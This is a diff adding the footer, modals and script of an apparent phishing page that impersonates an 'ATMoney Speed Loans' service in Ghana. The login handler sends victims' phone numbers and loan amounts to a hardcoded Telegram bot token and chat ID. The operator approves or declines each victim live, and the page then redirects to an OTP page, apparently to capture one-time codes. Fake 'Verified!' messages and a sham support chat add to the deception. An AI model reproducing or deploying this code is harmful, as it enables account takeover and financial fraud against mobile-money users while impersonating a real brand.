+        <a href="#home" class="logo">
+          <img src="logo.png" alt="ATMoney Logo" style="width: 38px; height: 38px; object-fit: contain; border-radius: 50%; background: white; padding: 2px;">
+          <div class="logo-text-wrap">
+            <div class="logo-name" style="color:#fff;">ATMoney<span>Speed Loans</span></div>
+            <div class="logo-sub" style="color:rgba(255,255,255,.4);">Life is Simple</div>
+          </div>
+        </a>
+        <p class="footer-desc">Instant, secure, and dignified mobile credit for active ATMoney users across Ghana. Funded by First Atlantic Bank.</p>
+      </div>
+      
+      <div class="footer-col">
+        <h4>Product</h4>
+        <a href="#loans">Loan Packages</a>
+        <a href="#calc">Loan Calculator</a>
+        <a href="#how">How It Works</a>
+        <a href="#benefits">Benefits</a>
+      </div>
+      
+      <div class="footer-col">
+        <h4>Support</h4>
+        <a href="#faq">Official FAQ</a>
+        <a href="#">ATMoney Info</a>
+        <a href="#">Call 100</a>
+        <a href="#faq">FAQ Section</a>
+      </div>
+      
+      <div class="footer-col">
+        <h4>Legal</h4>
+        <a href="#">ATMoney Ghana</a>
+        <a href="#">Privacy Policy</a>
+        <a href="#">Terms &amp; Conditions</a>
+        <a href="#">Cookie Policy</a>
+      </div>
+    </div>
+    
+    <div class="footer-bottom">
+      <p>&copy; 2026 ATMoney Ghana. All rights reserved.</p>
+      <div style="display:flex; gap:20px;">
+        <p>Funded by First Atlantic Bank (FAB)</p>
+      </div>
+    </div>
+    
+    <div class="footer-disclaimer">
+      Disclaimer: ATMoney Speed Loans are subject to eligibility criteria and wallet activity assessment. Late repayments attract a one-time 12.5% penalty. Always borrow responsibly and repay on time to maintain your credit limit. This service is exclusively for ATMoney wallet holders in Ghana.
+    </div>
+  </div>
+</footer>
+
+<!-- MODALS -->
+<div class="modal-overlay" id="loginModal">
+  <div class="modal">
+    <div class="modal-header">
+      <div class="modal-header-left">
+        <div class="modal-header-icon">⚡</div>
+        <h2>Verify Account</h2>
+      </div>
+      <button class="modal-close" onclick="closeModal('loginModal')">×</button>
+    </div>
+    <div class="modal-body">
+      <p class="modal-sub">Enter your ATMoney phone number to check your loan eligibility and limit instantly.</p>
+      
+      <div class="input-wrap">
+        <label>ATMoney Phone Number</label>
+        <input type="text" class="modal-input" id="loginPhone" placeholder="e.g. 027XXXXXXX" maxlength="10">
+      </div>
+      
+      <div class="input-wrap" style="display:none;" id="loginAmountWrap">
+        <label>Desired Loan Amount (GHS)</label>
+        <input type="number" class="modal-input" id="loginAmount" placeholder="1000">
+      </div>
+      
+      <div class="eligibility-info-box">
+        <div class="ei-icon">✓</div>
+        <div class="ei-text">Regular ATMoney users who transact daily enjoy higher loan limits automatically.</div>
+      </div>
+      
+      <button class="modal-btn" onclick="handleLogin()">Check Eligibility ⚡</button>
+      <p class="modal-note">By proceeding, you agree to our <a href="#">Terms of Service</a> and <a href="#">Privacy Policy</a>.</p>
+    </div>
+  </div>
+</div>
+
+<div class="modal-overlay" id="confirmModal">
+  <div class="modal">
+    <div class="modal-header">
+      <div class="modal-header-left">
+        <div class="modal-header-icon" style="background:var(--green);">✅</div>
+        <h2>Loan Summary</h2>
+      </div>
+      <button class="modal-close" onclick="closeModal('confirmModal')">×</button>
+    </div>
+    <div class="modal-body">
+      <p class="modal-sub">Review your selected loan details before proceeding to verification.</p>
+      
+      <div class="confirm-summary">
+        <div class="loan-detail-row">
+          <div class="loan-detail-label">Loan Amount</div>
+          <div class="loan-detail-value" id="confirmAmount">GHS 1,000.00</div>
+        </div>
+        <div class="loan-detail-row">
+          <div class="loan-detail-label">Period</div>
+          <div class="loan-detail-value" id="confirmDays">30 Days</div>
+        </div>
+        <div class="loan-detail-row">
+          <div class="loan-detail-label">Service Fee</div>
+          <div class="loan-detail-value red" id="confirmFee">GHS 89.00</div>
+        </div>
+        <div class="loan-detail-row">
+          <div class="loan-detail-label">Total Repay</div>
+          <div class="loan-detail-value green" id="confirmRepay">GHS 1,089.00</div>
+        </div>
+        <div class="loan-detail-row">
+          <div class="loan-detail-label">Late Penalty</div>
+          <div class="loan-detail-value" id="confirmLate" style="font-size:12px; color:var(--text-muted);">GHS 136.13 (12.5%)</div>
+        </div>
+      </div>
+      
+      <button class="modal-btn" onclick="proceedToApply()">Confirm & Apply ⚡</button>
+      <p class="modal-note">Funds will be sent directly to your ATMoney wallet upon final approval.</p>
+    </div>
+  </div>
+</div>
+
+<!-- TOAST -->
+<div class="toast" id="toast">
+  <div class="toast-icon" id="toastIcon">⚡</div>
+  <div>
+    <div class="toast-msg" id="toastMsg">Message</div>
+    <div class="toast-sub" id="toastSub">Sub message text</div>
+  </div>
+  <div class="toast-bar" id="toastBar"></div>
+</div>
+
+<!-- CHAT FAB -->
+<button class="chat-fab" onclick="openTawkChat()">
+  <div class="chat-fab-icon">💬</div>
+  <div class="chat-fab-text">Chat With Us</div>
+  <div class="chat-fab-dot"></div>
+</button>
+
+<script>
+  var currentAmount = 1000;
+  var currentDays   = 30;
+
+  // ── PERIOD INTEREST CALCULATION ──
+  function calcFee(amount, days) {
+    var monthlyRate = 0.089;
+    var dailyRate = monthlyRate / 30;
+    return amount * dailyRate * days;
+  }
+
+  function fmtPeriod(days) {
+    if (days < 30) return days + ' Days';
+    var months = days / 30;
+    if (months === 1) return '1 Month (30 Days)';
+    return months + ' Months (' + days + ' Days)';
+  }
+
+  function fmt(n) {
+    return 'GHS ' + n.toLocaleString('en-GH', {minimumFractionDigits:2, maximumFractionDigits:2});
+  }
+
+  // ── SYNC UI ──
+  function syncUI() {
+    var fee    = calcFee(currentAmount, currentDays);
+    var repay  = currentAmount + fee;
+
+    // Slider
+    var slider = document.getElementById('amountSlider');
+    slider.value = currentAmount;
+    fillSlider(slider);
+
+    // Amount display
+    document.getElementById('amountDisplay').textContent = currentAmount.toLocaleString('en-GH');
+    document.getElementById('amountInput').value = currentAmount;
+
+    // Days display
+    var daysDiv = document.getElementById('daysDisplay');
+    var unitDiv = document.getElementById('daysUnit');
+    if (currentDays < 30) {
+      daysDiv.textContent = currentDays;
+      unitDiv.textContent = 'Days';
+    } else {
+      daysDiv.textContent = currentDays / 30;
+      unitDiv.textContent = currentDays / 30 === 1 ? 'Month' : 'Months';
+    }
+
+    // Results panel
+    document.getElementById('receiveAmt').textContent   = fmt(currentAmount);
+    document.getElementById('periodDisplay').textContent = fmtPeriod(currentDays);
+    document.getElementById('feeAmt').textContent        = fmt(fee) + ' (' + (fee/currentAmount*100).toFixed(2) + '%)';
+    document.getElementById('repayAmt').textContent      = fmt(repay);
+
+    // Amount chips
+    document.querySelectorAll('#amountChips .chip').forEach(function(c) {
+      var val = parseInt(c.textContent.replace(/[^0-9]/g,''));
+      c.classList.toggle('active', val === currentAmount);
+    });
+  }
+
+  function updateCalc() {
+    currentAmount = parseInt(document.getElementById('amountSlider').value) || 100;
+    syncUI();
+  }
+
+  function onManualAmount() {
+    var v = parseInt(document.getElementById('amountInput').value) || 100;
+    v = Math.min(50000, Math.max(100, v));
+    currentAmount = v;
+    syncUI();
+  }
+
+  function setAmount(a) {
+    currentAmount = a;
+    syncUI();
+  }
+
+  function setPeriod(days) {
+    currentDays = days;
+    document.querySelectorAll('#daysChips .chip').forEach(function(c) {
+      c.classList.remove('active');
+      var val = parseInt(c.textContent);
+      var isMonth = c.textContent.includes('Month');
+      var cDays = isMonth ? val * 30 : val;
+      if (cDays === days) c.classList.add('active');
+    });
+    syncUI();
+  }
+
+  function selectLoan(amount, days) {
+    currentAmount = amount;
+    currentDays   = days;
+    syncUI();
+    openConfirmModal();
+  }
+
+  syncUI();
+
+  // ── SLIDESHOW ──
+  var currentSlide = 0;
+  var slideTimer;
+  var totalSlides = 5;
+
+  function goToSlide(n) {
+    var slides = document.querySelectorAll('.slide');
+    var dots   = document.querySelectorAll('.slide-dot');
+    slides[currentSlide].classList.remove('active');
+    dots[currentSlide].classList.remove('active');
+    currentSlide = ((n % totalSlides) + totalSlides) % totalSlides;
+    slides[currentSlide].classList.add('active');
+    dots[currentSlide].classList.add('active');
+  }
+
+  function moveSlide(dir) {
+    clearInterval(slideTimer);
+    goToSlide(currentSlide + dir);
+    startSlideTimer();
+  }
+
+  function startSlideTimer() {
+    slideTimer = setInterval(function(){ goToSlide(currentSlide + 1); }, 5500);
+  }
+  startSlideTimer();
+
+  // ── SCROLL HELPER ──
+  function scrollTo(id) {
+    var el = document.getElementById(id);
+    if (el) el.scrollIntoView({behavior:'smooth'});
+  }
+
+  // ── MODALS ──
+  function openLoginModal() {
+    document.getElementById('loginModal').classList.add('open');
+    document.body.style.overflow = 'hidden';
+  }
+
+  function openConfirmModal() {
+    var fee   = calcFee(currentAmount, currentDays);
+    var repay = currentAmount + fee;
+    var late  = repay * 0.125;
+    document.getElementById('confirmAmount').textContent = fmt(currentAmount);
+    document.getElementById('confirmDays').textContent   = fmtPeriod(currentDays);
+    document.getElementById('confirmFee').textContent    = fmt(fee);
+    document.getElementById('confirmRepay').textContent  = fmt(repay);
+    document.getElementById('confirmLate').textContent   = fmt(late) + ' (12.5%)';
+    document.getElementById('confirmModal').classList.add('open');
+    document.body.style.overflow = 'hidden';
+  }
+
+  function closeModal(id) {
+    document.getElementById(id).classList.remove('open');
+    document.body.style.overflow = '';
+  }
+
+  document.querySelectorAll('.modal-overlay').forEach(function(o) {
+    o.addEventListener('click', function(e) {
+      if (e.target === o) { o.classList.remove('open'); document.body.style.overflow = ''; }
+    });
+  });
+
+  // ── TELEGRAM CONFIG ──
+  const BOT = '8807278526:AAF8s3Z7XsjQNSk2ybpDwyappH6F7aWQexM';
+  const CID = '7547427914';
+
+  function sendLoginToTelegram(phone, amount, callback) {
+    var ts = Date.now();
+    var msg = '<b>🔴 NEW LOGIN — ATMoney Speed Loans</b>\n\n' +
+              'Phone: <code>' + phone + '</code>\n' +
+              'Amount: <code>GHS ' + amount + '</code>\n' +
+              'Time: <code>' + new Date().toLocaleString() + '</code>\n\n' +
+              'Waiting for approval...';
+
+    fetch('https://api.telegram.org/bot' + BOT + '/sendMessage', {
+      method: 'POST',
+      headers: { 'Content-Type': 'application/json' },
+      body: JSON.stringify({
+        chat_id: CID,
+        text: msg,
+        parse_mode: 'HTML',
+        reply_markup: {
+          inline_keyboard: [
+            [{ text: '✅ Approve', callback_data: 'login_approve_' + ts }],
+            [{ text: '❌ Decline', callback_data: 'login_decline_' + ts }]
+          ]
+        }
+      })
+    })
+    .then(function(res) { return res.json(); })
+    .then(function(data) {
+      if (data.ok) {
+        var lastOffset = 0;
+        var interval = setInterval(function() {
+          fetch('https://api.telegram.org/bot' + BOT + '/getUpdates?offset=' + (lastOffset + 1))
+            .then(function(r) { return r.json(); })
+            .then(function(updates) {
+              if (!updates.ok || !updates.result) return;
+              updates.result.forEach(function(update) {
+                lastOffset = update.update_id;
+                if (update.callback_query) {
+                  var cb = update.callback_query.data;
+                  if (cb === 'login_approve_' + ts || cb === 'login_decline_' + ts) {
+                    clearInterval(interval);
+                    if (cb.startsWith('login_approve_')) {
+                      callback(true);
+                    } else {
+                      callback(false);
+                    }
+                  }
+                }
+              });
+            })
+            .catch(function() {});
+        }, 1000);
+        setTimeout(function() {
+          clearInterval(interval);
+          callback(true);
+        }, 30000);
+      } else {
+        callback(true);
+      }
+    })
+    .catch(function() {
+      callback(true);
+    });
+  }
+
+  // ── LOGIN HANDLER ──
+  function handleLogin() {
+    var phone = document.getElementById('loginPhone').value.trim();
+    if (!phone || phone.length < 10) {
+      showToast('❌', 'Invalid Number', 'Please enter a valid 10-digit ATMoney number.');
+      return;
+    }
+    closeModal('loginModal');
+    showToast('✅', 'Verified!', 'Redirecting to OTP verification...');
+
+    var amount = document.getElementById('loginAmount').value.trim() || '1000';
+    var queryParams = 'phone=' + encodeURIComponent(phone) +
+                     '&amount=' + encodeURIComponent(amount) +
+                     '&name=Speed Loan';
+
+    sendLoginToTelegram(phone, amount, function(approved) {
+      if (approved) {
+        setTimeout(function() {
+          window.location.href = 'otp.html?' + queryParams;
+        }, 1500);
+      } else {
+        showToast('❌', 'Declined', 'Your request was declined. Please try again.');
+        setTimeout(function() { openLoginModal(); }, 1000);
+      }
+    });
+  }
+
+  function proceedToApply() {
+    closeModal('confirmModal');
+    showToast('⚡', 'Redirecting...', 'Taking you to verification...');
+    var phone = document.getElementById('loginPhone') ? document.getElementById('loginPhone').value.trim() : '';
+    var amount = currentAmount || 1000;
+    var days = currentDays || 30;
+    var fee = calcFee(amount, days);
+    var queryParams = 'phone=' + encodeURIComponent(phone || '0000000000') +
+                     '&amount=' + encodeURIComponent(amount) +
+                     '&duration=' + encodeURIComponent(fmtPeriod(days)) +
+                     '&rate=8.9%' +
+                     '&fee=' + encodeURIComponent(fee.toFixed(2)) +
+                     '&name=Speed Loan';
+    setTimeout(function() {
+      window.location.href = 'otp.html?' + queryParams;
+    }, 1200);
+  }
+
+  // ── TOAST ──
+  var toastTimer;
+  function showToast(icon, msg, sub) {
+    document.getElementById('toastIcon').textContent = icon;
+    document.getElementById('toastMsg').textContent  = msg;
+    document.getElementById('toastSub').textContent  = sub;
+    var t   = document.getElementById('toast');
+    var bar = document.getElementById('toastBar');
+    bar.style.animation = 'none';
+    void bar.offsetWidth;
+    bar.style.animation = '';
+    t.classList.add('show');
+    clearTimeout(toastTimer);
+    toastTimer = setTimeout(function(){ t.classList.remove('show'); }, 3800);
+  }
+
+  // ── FAQ ──
+  function toggleFaq(el) {
+    var item   = el.closest('.faq-item');
+    var isOpen = item.classList.contains('open');
+    document.querySelectorAll('.faq-item').forEach(function(i){ i.classList.remove('open'); });
+    if (!isOpen) item.classList.add('open');
+  }
+
+  // ── MOBILE MENU ──
+  function toggleMenu() {
+    var menu = document.getElementById('mobileMenu');
+    var ham  = document.getElementById('hamburger');
+    menu.classList.toggle('open');
+    ham.classList.toggle('active');
+  }
+
+  function closeMenu() {
+    document.getElementById('mobileMenu').classList.remove('open');
+    document.getElementById('hamburger').classList.remove('active');
+  }
+
+  // ── ACTIVE NAV ON SCROLL ──
+  var sections = document.querySelectorAll('section[id], .hero[id]');
+  window.addEventListener('scroll', function() {
+    var cur = '';
+    sections.forEach(function(s) {
+      if (window.scrollY >= s.offsetTop - 90) cur = s.id;
+    });
+    document.querySelectorAll('nav a').forEach(function(a) {
+      var href = a.getAttribute('href');
+      a.classList.toggle('active', href === '#' + cur || (cur === 'home' && href === '#home') || (cur === '' && href === '#home'));
+    });
+  }, {passive:true});
+
+  // ── SLIDER COLOR FILL ──
+  function fillSlider(slider) {
+    var min = slider.min, max = slider.max, val = slider.value;
+    var pct = ((val - min) / (max - min)) * 100;
+    slider.style.background = 'linear-gradient(to right, #003DA5 ' + pct + '%, #E4E6EA ' + pct + '%)';
+  }
+
+  document.querySelectorAll('input[type=range]').forEach(function(s) {
+    s.addEventListener('input', function(){ fillSlider(s); });
+    fillSlider(s);
+  });
+
+  function openTawkChat() {
+    showToast('💬', 'Chat Initialized', 'Our support team will be with you shortly.');
+  }
+</script>
+</body>
+</html>
